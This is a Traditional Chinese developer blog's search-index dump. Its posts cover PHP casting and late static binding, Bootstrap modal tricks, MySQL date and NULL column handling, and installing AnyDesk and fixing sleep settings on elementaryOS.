PHP – Tony Showoff 這篇文獻能看到 intval 是比較吃效能的 那我就想intval()有何作用? php - Is there any particular difference between intval and casting to int - (int) X? - Stack Overflow 原來主要可以算 2 進位和 8 進位 現在仔細想想，JavaScript 也有一個parseInt(xxx) 這個第二個參數沒帶，第一個參數 0 開頭是8位元算 這個我曾經踩過，因為 uid 是 0 開頭，剛好要轉數字，跑出一個錯誤訊息，後來才知道轉成 8 位元 有聽到資深的前輩說後面第二個參數還是乖乖加個10會比較好 參考來源 php - Is there any particular difference between intval and casting to int - (int) X? - Stack Overflow Casting int faster than intval in PHP – Tony Showoff Php string cast vs strval function which should I use? - Stack Overflow php - Is there any particular difference between intval and casting to int - (int) X? - Stack Overflow ","date":"2019-02-24","objectID":"/blog/posts/PHP-intval%E8%B7%9F-int-%E5%BC%B7%E5%88%B6%E8%BD%89%E5%9E%8B%E5%B7%AE%E5%88%A5/:0:0","tags":["php"],"title":"PHP intval跟(int)強制轉型差別","uri":"/blog/posts/PHP-intval%E8%B7%9F-int-%E5%BC%B7%E5%88%B6%E8%BD%89%E5%9E%8B%E5%B7%AE%E5%88%A5/"},{"categories":["PHP"],"content":"本篇有毒，請小心服用 本篇有毒，請小心服用 本篇有毒，請小心服用 推薦看這篇Self, this, static 在 PHP 中的差異 - Learn or Die、Ray Lee | 李宗叡 – Medium內容，大神整理的文章就是不一樣，當出只是想了解 static ，結果查到相關東西有點多，就動手實作就順便記錄，因為我程式能力也不是特別強，英文也不是特別好，所以這篇文章都是測試看結果推測結論，這可能不是最正確的方法，所以不推薦路過的人看這篇。 當出只是想留給自己當記錄用，就想應該沒有人會看到這篇，前陣子看到FB大神貼的文章，想說之前有寫過，看到下面有引用我的文章，嚇死哥了！！丟臉死啦 本篇應該不會再修正，因為我最近工作是使用 Java，所以不會再跳回已前的坑。其實我還是沒有把握寫好這篇!!XD我原本想寫 Blog 是當做自己筆記，想說常常也從別的 Blog 學到一些東西，也當然想分享到網路上，希望路過的人能看到我的文章解決問題我也會滿高興的。 網路很容易分享資訊，但分享出去資訊是不是正確也要自己驗證，有錯誤也歡迎指教，也可以跟我說哪裡有錯。 =========== 最近使用在看static部份 平常很少用，過很久可能就會忘了這是什麼東西 但 global 部份應該不再記錄 PHP 有關參照(Reference)的那些事 | 程式狂想筆記 這裡面有簡單提到 ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:0:0","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"static 用在變數 static 通常是寫在 function 裡面 但寫在 function 外面也不會報錯 一般沒有 static \u003c?php function test() { $a = 0; echo $a; $a++; } test(); //0 test(); //0 test(); //0 ?\u003e static 後 \u003c?php function test() { static $a = 0; echo $a; $a++; } test(); //1 test(); //2 test(); //3 ?\u003e ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:1:0","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"遞迴 function static 變數 先看官網範例，可以用在遞迴，但後面注意$count--的關係 所以跑完$count變數會歸 0 但是沒有寫$count--不會 \u003c?php function test() { static $count = 0; $count++; echo $count; if ($count \u003c 10) { test(); } $count--; } test(); // 12345678910 echo PHP_EOL; test(); // 12345678910 ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:1:1","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"定義 static 變數限制 簡單看官往範例，其實也滿好懂得 用運算式再次進入 function 怎麼知道初始值 \u003c?php function foo(){ static $int = 0; // correct static $int = 1+2; // correct (as of PHP 5.6) static $int = sqrt(121); // wrong (as it is a function) $int++; echo $int; } ?\u003e 靜態聲明是在編譯時解析的。 深入理解 PHP 代码的执行的过程 - risingsun001 的专栏 - CSDN 博客 這一快我不是很了解 ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:1:2","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"static 用在 Object Function ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:2:0","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"self 這邊先介紹 Object 會用到的 self self:: 或者 __CLASS__，也可以用 get_class()呼叫 簡單說明一下，這邊跟 Java 的 this 很像 當是參照當前放置的 class 位置 可以看一下java method 類別成員(class member) 繼承踩雷 | 程式狂想筆記 \u003c?php class A { public static function who() { echo __CLASS__; } public static function test() { self::who(); } } class B extends A { public static function who() { echo __CLASS__; } } B::test(); #A ?\u003e ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:2:1","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"static ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:2:2","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"Late Static Bindings(后期静态绑定) static 跟 get_called_class()方法一樣，他是指實例後物件位置 \u003c?php class A { public static function who() { echo __CLASS__; } public static function test() { static::who(); // 后期静态绑定从这里开始 } } class B extends A { public static function who() { echo __CLASS__; } } B::test(); # B ?\u003e 在非靜態環境下，所調用的類即為該對象實例所屬的類。由於 $this-\u003e 會在同一作用範圍內嘗試調用私有方法，而 static:: 則可能給出不同結果。另一個區別是 static:: 只能用於靜態屬性。 ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:3:0","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"在非靜態環境下使用 static:: Note: 在非靜態環境下，所調用的類即為該對象實例所屬的類。由於 $this-\u003e 會在同一作用範圍內嘗試調用私有方法，而 static:: 則可能給出不同結果。另一個區別是 static:: 只能用於靜態屬性。 事後我在網路上找到了，更詳細解說 PHP 中 self、static、$this 的区别 \u0026 后期静态绑定详解 - 彳亍 - CSDN 博客 備份圖 老實說這篇寫很亂了 orz 注意事项 非静态环境下的私有方法的查找顺序 在非静态环境下，在类的非静态方法中，使用 $this 和 static 调用类的私有方法时，执行方式有所不同。 $this 会优先寻找所在定义范围（父类）中的私有方法，如果存在就调用。 static 是先到它指向的类（子类）中寻找私有方法，如果找到了就会报错，因为私有方法只能在它所定义的类内部调用；如果没找到，再去所在定义范围（父类）中寻找该私有方法，如果存在就调用。 具体来说，$this 会先到所在定义范围内寻找私有方法，再到它指向的对象所属的类中寻找私有方法，然后寻找公有方法，最后到所在定义范围内寻找公共方法。只要找到了匹配的方法，就调用，并停止查找。 而 static 则是先到它指向的类中寻找私有方法，再寻找共有方法；然后到所在定义范围内寻找私有方法，再寻找共有方法。只要找到了匹配的方法，就调用，并停止查找。 --------------------- 作者：lamp_yang_3533 来源：CSDN 原文：https://blog.csdn.net/lamp_yang_3533/article/details/79912453 版权声明：本文为博主原创文章，转载请附上博文链接！ \u003c?php class A { private function foo() { echo \"success!\\n\"; } public function test() { $this-\u003efoo(); static::foo(); //** C實例呼叫的時候會有問題 } } class B extends A { /* foo() will be copied to B, hence its scope will still be A and * the call be successful */ } class C extends A { private function foo() { /* original method is replaced; the scope of the new one is C */ } } $b = new B(); $b-\u003etest(); $c = new C(); $c-\u003etest(); //fails // success! // success! // success! // \u003cbr /\u003e // \u003cb\u003eFatal error\u003c/b\u003e: Uncaught Error: Call to private method C::foo() from context 'A' in [...][...]:9 // Stack trace: // #0 [...][...](27): A-\u0026gt;test() // #1 {main} // thrown in \u003cb\u003e[...][...]\u003c/b\u003e on line \u003cb\u003e9\u003c/b\u003e\u003cbr /\u003e // PHP 5 // Fatal error: Call to private method C::foo() from context 'A' in /tmp/test.php on line 9 ?\u003e Late static bindings’ resolution will stop at a fully resolved static call with no fallback. On the other hand, static calls using keywords like parent:: or self:: will forward the calling information. \u003c?php class A { public static function foo() { static::who();// (2) 遇到後期靜態綁定 } public static function who() { echo __CLASS__.\"\\n\"; } } class B extends A { public static function test() { A::foo();// 這不是轉發 (1) parent::foo();// 這是轉發 (1) self::foo();// 這是轉發 (1) static::foo();// 這是轉發 (1) } public static function who() { echo __CLASS__.\"\\n\"; } } class C extends B { public static function who() { echo __CLASS__.\"\\n\"; } } C::test(); // A // C // C // C // A // C // C // C ?\u003e \u003c?php class A { public static function foo() { static::who();// } public static function who() { echo __CLASS__.\"\\n\"; //這個不是後期靜態綁定 } } class B extends A { public static function test() { A::who();// 這不是轉發 parent::who();// 這是轉發 self::who();// 這是轉發 static::who();// 這是轉發 } public static function who() { echo __CLASS__.\"\\n\"; } } class C extends B { public static function who() { echo __CLASS__.\"\\n\"; } } $c = new C; $c-\u003etest(); C::test(); // A // A // B // C // A // A // B // C ?\u003e 老實說上面例子花我很多時間想的，重寫兩次文章(因為一直發現理解錯誤) 只要進入 B 的 parent,static,self 再跳到 A 的 test function 裡面的static::who();(後期靜態綁定) 就會抓當下 class 不管是實例或者 static 都會印出 C 下面是直接在 B 的 test()做，第一次的時候做轉發，跳到下一個 function *沒有用後期靜態綁定 而且__CLASS__(self)，只會抓到原本的類別(非實例出來的類別) 這邊的 static 轉發(forward)同等於forward_static_call() 所以下面這個範例，__CLASS__改成get_called_class()一樣會變成上面結果一致 PHP: forward_static_call - Manual ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:3:1","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"forward_static_call 和 call_user_func 這兩個 function 功能很像，但差在用在 static 地方。 重點是下面這兩個call_user_func('A::bar'); //non-forwarding, 'A'和forward_static_call('A::bar'); //forwarding, 'B' 這兩個讓我想到 JavaScript 閉包用到(this)這個東西，但 js 解決方法是用箭頭函式和var that = this解決(題外話，請忽略這段) 但 forward_static_call 有一個例外，當父類別到子類別的話，不做轉發動做，看下面範例 php 5.3 - PHP forward_static_call vs call_user_func - Stack Overflow The difference is just that forward_static_call does not reset the \"called class\" information if going up the class hierarchy and explicitly naming a class, whereas call_user_func resets the information in those circumstances (but still does not reset it if using parent, static or self). Example: \u003c?php class A { static function bar() { echo get_called_class(), \"\\n\"; } } class B extends A { static function foo() { parent::bar(); //forwards static info, 'B' call_user_func('parent::bar'); //forwarding, 'B' call_user_func('static::bar'); //forwarding, 'B' call_user_func('A::bar'); //non-forwarding, 'A' forward_static_call('parent::bar'); //forwarding, 'B' forward_static_call('A::bar'); //forwarding, 'B' } } B::foo(); Note that forward_static_call refuses to forward if going down the class hierarchy: \u003c?php class A { static function foo() { forward_static_call('B::bar'); //non-forwarding, 'B' } } class B extends A { static function bar() { echo get_called_class(), \"\\n\"; } } A::foo(); Finally, note that forward_static_call can only be called from within a class method. The difference is just that forward_static_call does not reset the “called class” information if going up the class hierarchy and explicitly naming a class, whereas call_user_func resets the information in those circumstances (but still does not reset it if using parent, static or self). 最後我覺得 static 和$this 很相似 但看到這篇裡面有寫差異 雖然我有一點 Java 物件導向觀念，但是 PHP 物件導向還滿難理解 static 和 $this 有点类似，但又有区别： $this 指向的对象所属的类和 static 指向的类相同。 $this 不能用于静态方法中，也不能访问类的静态属性和常量。 $this 指向的是实际调用的对象。 static 可以用于静态或非静态方法中，也可以访问类的静态属性、静态方法、常量和非静态方法，但不能访问非静态属性。 static 指向的是实际调用时的对象所属的类。 --------------------- 作者：lamp_yang_3533 来源：CSDN 原文：https://blog.csdn.net/lamp_yang_3533/article/details/79912453 版权声明：本文为博主原创文章，转载请附上博文链接！ ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:4:0","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["PHP"],"content":"參考來源 PHP 的 static 與 self 兩個關鍵字的差異 | Asika Lab 飛鳥實驗室 PHP: Late Static Bindings - Manual PHP: forward_static_call - Manual PHP forward_static_call vs call_user_func | landcareweb.com PHP 5.3/6 新增功能 - Late Static Bindings - 石頭閒語 php 5.3 - PHP forward_static_call vs call_user_func - Stack Overflow PHP forward_static_call 和 call_user_func - 代码日志 PHP: forward_static_call - Manual PHP 关于 self:: 和 static:: | 随意博客 通过 static 关键词来实现 late static binding（静态调用绑定）-pilishen.com,做全球最好的实战教程 [PHP 觀念]self 和$this 的差異 @ 麥克的學習紀錄 :: 痞客邦 :: ","date":"2019-02-20","objectID":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/:5:0","tags":["php","static"],"title":"PHP - static那些事","uri":"/blog/posts/PHP-static%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":null,"content":"說真的平常只用 Boostrap 基本東西 很少深入研究這個東西 今天看到一段程式 感覺 Bootstrap 值得深入研究 ","date":"2019-02-19","objectID":"/blog/posts/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/:0:0","tags":null,"title":"Bootstrap 不知道Modal一些事筆記","uri":"/blog/posts/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/"},{"categories":null,"content":"remote (v4 以廢棄) \u003ca data-toggle=\"modal\" href=\"remote.html\" data-target=\"#modal\"\u003eClick me\u003c/a\u003e 可以呼叫remote.html到#modal裡面去 沒錯我當初看到的時候 覺得很神奇 跑去官網文件都沒有找到 結果查看了一下 v3 This option is deprecated since v3.3.0 and has been removed in v4. We recommend instead using client-side templating or a data binding framework, or calling jQuery.load yourself 這麼好用的功能…，怎麼要廢棄掉??? Bootstrap 3 with remote Modal - Stack Overflow 所以之後可能需要用 jQuery.load 手動載入方式 ","date":"2019-02-19","objectID":"/blog/posts/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/:1:0","tags":null,"title":"Bootstrap 不知道Modal一些事筆記","uri":"/blog/posts/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/"},{"categories":null,"content":"神奇清除 remote 表單 $(\"#myModal\").on(\"hidden.bs.modal\", function() { $(this).removeData(\"bs.modal\"); }); Plunker 其實仔細觀察，開發者工具看，他會重新載入網頁 所以值都是一開始的樣子 有時候還會失敗，最好的方式就是 不過這個方法，只能適用在 remote 所以網路上只看到 v2,v3 但沒有看到 v4 ","date":"2019-02-19","objectID":"/blog/posts/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/:1:1","tags":null,"title":"Bootstrap 不知道Modal一些事筆記","uri":"/blog/posts/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/"},{"categories":null,"content":"修改表單小技巧 Modal · Bootstrap 平常我們重開 modal，打開兩次，第一次修改，直接取消，第二次打開後可能是第一次修改取消的值 原本 remote 方式可以輕鬆解決 但是網路上有找到用data-*方式去紀錄 Correct approach of getting dynamic values from data-attributes with jQuery \u003cbutton type=\"button\" id=\"btn1\" class=\"btn btn-primary\" data-toggle=\"modal\" data-target=\"#exampleModal\" data-title=\"Post 1\" \u003e Edit \u003c/button\u003e \u003cdiv class=\"modal fade\" id=\"exampleModal\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"exampleModalLabel\" aria-hidden=\"true\" \u003e \u003cdiv class=\"modal-dialog\" role=\"document\"\u003e \u003cdiv class=\"modal-content\"\u003e \u003cdiv class=\"modal-header\"\u003e \u003ch5 class=\"modal-title\" id=\"exampleModalLabel\"\u003eNew message\u003c/h5\u003e \u003cbutton type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\" \u003e \u003cspan aria-hidden=\"true\"\u003e\u0026times;\u003c/span\u003e \u003c/button\u003e \u003c/div\u003e \u003cform\u003e \u003cdiv class=\"modal-body\"\u003e \u003cdiv class=\"form-group\"\u003e \u003clabel for=\"title\" class=\"col-form-label\"\u003eTitle:\u003c/label\u003e \u003cinput type=\"text\" class=\"form-control\" id=\"title\" name=\"title\" /\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"modal-footer\"\u003e \u003cbutton type=\"button\" class=\"btn btn-secondary\" data-dismiss=\"modal\"\u003e Close \u003c/button\u003e \u003cbutton type=\"button\" class=\"btn btn-primary\" onClick=\"edit(this.form)\" \u003e Submit \u003c/button\u003e \u003c/div\u003e \u003c/form\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e $(\"#exampleModal\").on(\"show.bs.modal\", function(event) { var button = $(event.relatedTarget); var recipient = button.attr(\"data-title\"); var modal = $(this); modal.find(\".modal-body input#title\").val(recipient); }); function edit(form) { var title = form.title.value; ////// insert into database var btn1 = document.getElementById(\"btn1\"); btn1.setAttribute(\"data-title\", form.title.value); } 但 Modal 還不只這樣 有空深入研究在寫 ","date":"2019-02-19","objectID":"/blog/posts/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/:2:0","tags":null,"title":"Bootstrap 不知道Modal一些事筆記","uri":"/blog/posts/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"之前不同公司 db 使用型態都不太一樣 前一間公司試用varchar 現在是用 datetime 預設值0000-00-00 最近在想這個預設值有甚麼好處 首先，一直搞不清楚不用 Null，印象中 Null 在做 Index 不是很好 我自己想出結論，這個可能可以優化 Index key ‘0000-00-00’大部分跟 NULL 一樣(https://dev.mysql.com/doc/refman/8.0/en/using-date.html) 但是看到 MySQL 之後版本預設 sql_mode 有 NO_ZERO_IN_DATE,NO_ZERO_DATE 不能使用'0000-00-00’，感覺 MySQL 官方預設都不建議用'0000-00-00’ 我有特別 Google 一下，感覺兩種都有人在用 Datetime NULL or 0000-00-00 00:00:00 - Databases - The SitePoint Forums mysql - default date ‘0000-00-00 00:00:00’ or null - Stack Overflow 感覺大多留言是偏向使用null 不過，我有去社群問問大家Backend 台灣 (Backend Tw) int / timestamp/ datetime 這三種來記錄 在大量資料來做搜索時(沒索引) 效能是 int \u003e UNIX_TIMESTAMP \u003e timestamp \u003e datetime 有索引 效能是 UNIX_TIMESTAMP \u003e int \u003e timestamp \u003e datetime 一般用框架的，都是 timestamp ，而且沒有就是 0，這樣子最快，只是需要轉換而已 ","date":"2019-02-18","objectID":"/blog/posts/DB%E5%AD%98%E6%99%82%E9%96%93%E6%A0%BC%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9E%8B%E6%85%8B%E5%8F%AF%E4%BB%A5%E7%94%A8-%E7%B6%93%E9%A9%97%E5%88%86%E4%BA%AB/:0:0","tags":["mysql"],"title":"DB存時間格式有哪些型態可以用(經驗分享)","uri":"/blog/posts/DB%E5%AD%98%E6%99%82%E9%96%93%E6%A0%BC%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9E%8B%E6%85%8B%E5%8F%AF%E4%BB%A5%E7%94%A8-%E7%B6%93%E9%A9%97%E5%88%86%E4%BA%AB/"},{"categories":null,"content":"最近修改 null 欄位改成非 null 欄位 在測試環境上修改欄位通過 但到正式環境就沒通過 卡了很久整理一下，一些問題 ","date":"2019-02-18","objectID":"/blog/posts/mariadb-mysql%E4%BF%AE%E6%94%B9%E6%AC%84%E4%BD%8D%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:0:0","tags":null,"title":"mariadb/mysql修改欄位可能要注意的事情","uri":"/blog/posts/mariadb-mysql%E4%BF%AE%E6%94%B9%E6%AC%84%E4%BD%8D%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":null,"content":"MySQL、MariaDB 在一般實作 int(null)-\u003eint(not null)，null 值都會自動轉乘0，舊版可能會自動轉，MySQL 8.0 不會自動轉，會報Invalid use of NULL value varchar,datetime(null) -\u003e(not null)，會報錯誤 Invalid use of NULL value 但 int 有找到下 MySQL alter table modify column failing at rows with null values - Stack Overflow MySQL 5.7 預設 SQL 模式帶來的問題總結 | 程式前沿 XYZ 的筆記本: MySQL 資料表分區(partition) ","date":"2019-02-18","objectID":"/blog/posts/mariadb-mysql%E4%BF%AE%E6%94%B9%E6%AC%84%E4%BD%8D%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:1:0","tags":null,"title":"mariadb/mysql修改欄位可能要注意的事情","uri":"/blog/posts/mariadb-mysql%E4%BF%AE%E6%94%B9%E6%AC%84%E4%BD%8D%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":null,"content":"ignore alter ignore table MySQL alter table modify column failing at rows with null values - Stack Overflow 不過剛剛發現 MySQL 5.7 這個就不能用了… MariaDB 還可以 varchar(null) -\u003e 空字串 還發現很奇怪的是，MySQL 到後面版本有NO_ZERO_IN_DATE，NO_ZERO_DATE，TRADITIONAL 所以可能還是需要自己手動把 null 改成有值 雖然ignore好像能處理 但有可能會早成資料遺失的可能(修改 index) 測試 sql DROP TABLE IF EXISTS `test`; CREATE TABLE `test` ( `id` int(11) NOT NULL AUTO_INCREMENT, `a` varchar(10) DEFAULT NULL, `b` int(11) DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=latin1; INSERT INTO `test` (`id`, `a`, `b`) VALUES (1, NULL, NULL); -- 2019-02-18 13:06:14 可自己嘗試修改 a,b 欄位測試看看 其他資料 alter ignore table 添加 unique key - 菠萝大数据梦工厂（Free World） - CSDN 博客 MySQL 刪除重複的資料,只留下一筆資料 | 我的 PHP 冒險之路 MySQL 5.7 預設 SQL 模式帶來的問題總結 | 程式前沿 ","date":"2019-02-18","objectID":"/blog/posts/mariadb-mysql%E4%BF%AE%E6%94%B9%E6%AC%84%E4%BD%8D%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:2:0","tags":null,"title":"mariadb/mysql修改欄位可能要注意的事情","uri":"/blog/posts/mariadb-mysql%E4%BF%AE%E6%94%B9%E6%AC%84%E4%BD%8D%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["實用工具"],"content":"最近買 SSD 升級筆電 重新灌了 ElementaryOS 但發現之前 Anydesk 沒有記錄筆記 都會一直忘記 deb 要怎麼安裝 今天小記一下 有爬到手動安裝 安裝某個.deb檔案，簡單的在.deb檔案上Right單擊游標，然後選擇Kubuntu Package Menu-\u003e安裝軟體套件。 或者，你可以在終端下輸入如下內容來安裝.deb檔案 sudo dpkg -i 軟體套件名.deb 卸載.deb檔案，可以使用Adept，或輸入： sudo apt-get remove 軟體套件名稱 用 dpkg 安裝沒有想到可以這樣做 但有看到一種方式 sudo apt install ./anydesk_4.0.1-1_amd64.deb Command Line Interface - AnyDesk Help Center 安裝完設定，目前不確定是否要執行--start-service anydesk --start-service anydesk --get-status 可以開啟sudo anydesk設定一些東西 但是設定固定密碼一直失敗 sudo anydesk-global-settings 要打上面指令才能設定 ","date":"2019-02-13","objectID":"/blog/posts/Anydesk%E5%9C%A8Linux-elementaryOS-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/:0:0","tags":["anydesk","remoted desktop"],"title":"Anydesk在Linux(elementaryOS)安裝小記","uri":"/blog/posts/Anydesk%E5%9C%A8Linux-elementaryOS-%E5%AE%89%E8%A3%9D%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"最近重買 SSD 重灌 ElentmaryOS 0.5 版 發現設定 睡眠 停用 電腦竟然還是會做睡眠 起初我以為是設定的問題 但我看我設定都關掉了 這邊有找到解決方法 ","date":"2019-02-03","objectID":"/blog/posts/ElementaryOS%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8%E4%BC%91%E7%9C%A0%E4%BD%86%E9%82%84%E6%98%AF%E6%9C%83%E4%BC%91%E7%9C%A0%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/:0:0","tags":null,"title":"ElementaryOS設定停用休眠但還是會休眠問題解決方案","uri":"/blog/posts/ElementaryOS%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8%E4%BC%91%E7%9C%A0%E4%BD%86%E9%82%84%E6%98%AF%E6%9C%83%E4%BC%91%E7%9C%A0%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/"},{"categories":null,"content":"解決 elementary os 休眠問題 首先，有在elementary OS SSD 最佳化 – 皇家工程師看到 關閉休眠 (Hibernation) elementary OS 的休眠預設是關閉的。 檢查休眠是否為關閉的方式如下： 在終端機執行下列指令使用 nano 編輯器打開 /var/lib/polkit-1/localauthority/10-vendor.d/com.ubuntu.desktop.pkla sudo nano /var/lib/polkit-1/localauthority/10-vendor.d/com.ubuntu.desktop.pkla [Disable hibernate by default in upower] 和 [Disable hibernate by default in logind] 下的 ResultActive 為 No 的話就代表休眠是關閉的。如果是 Yes 的話，可以自己改成 No 關閉休眠。 目前設定確實跟預設一模一樣 不過睡眠(sleep mode)跟休眠(Hibernation)不太一樣 可參考[教學] 關機、待命、睡眠、休眠和交互式睡眠的分別 | FoolEgg.com 最後找到settings - Elementary OS ignoring suspend disable - elementary OS Stack Exchange 裡面Never suspend when plugged in setting ignored (always uses battery setting for suspend) · Issue #89 · elementary/switchboard-plug-power有一個 Github Issue 裡面還是 open 看到有一個 workaround 方式 sudo su enter, then your password su - -s /bin/bash lightdm enter dbus-launch gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type nothing enter gsettings get org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type enter it should return 'nothing' 最後使用真的有效!!! ","date":"2019-02-03","objectID":"/blog/posts/ElementaryOS%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8%E4%BC%91%E7%9C%A0%E4%BD%86%E9%82%84%E6%98%AF%E6%9C%83%E4%BC%91%E7%9C%A0%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/:1:0","tags":null,"title":"ElementaryOS設定停用休眠但還是會休眠問題解決方案","uri":"/blog/posts/ElementaryOS%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8%E4%BC%91%E7%9C%A0%E4%BD%86%E9%82%84%E6%98%AF%E6%9C%83%E4%BC%91%E7%9C%A0%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/"},{"categories":null,"content":"安裝 elementaryOS 0.5 小記 安裝 zplug 要裝 git 跟 安裝 hack font 可以使用sudo apt-get install fonts-hack picture-in-picture 使用方法是win+fPicture to Picture Mode in elementary OS 5.0 Juno - YouTube 很羨慕嗎?其實 Chrome 內建這個功能 Windows 也可以用 只可惜沒有快捷鍵可以做隱藏 偶爾使用會遇到 bug，但目前無傷大雅 程序员的七种武器之 Zsh - 从 Hello World 开始 ","date":"2019-02-03","objectID":"/blog/posts/ElementaryOS%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8%E4%BC%91%E7%9C%A0%E4%BD%86%E9%82%84%E6%98%AF%E6%9C%83%E4%BC%91%E7%9C%A0%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/:2:0","tags":null,"title":"ElementaryOS設定停用休眠但還是會休眠問題解決方案","uri":"/blog/posts/ElementaryOS%E8%A8%AD%E5%AE%9A%E5%81%9C%E7%94%A8%E4%BC%91%E7%9C%A0%E4%BD%86%E9%82%84%E6%98%AF%E6%9C%83%E4%BC%91%E7%9C%A0%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/"},{"categories":["PHP"],"content":"最近在看 PHP 官方參考文件 一直以為 PHP 有一個指針(pointer)觀念 今天讀到官網說「PHP 不是 reference、也不是 pinter 觀念」(雖然這樣想幾乎 87%都不會有問題) 瞬間有點黑人問號臉 也許是剛學時候就用這樣記住 但是今天要好好重新認識 PHP Reference 聽說就跟 Linux Hard Link 一樣的道理 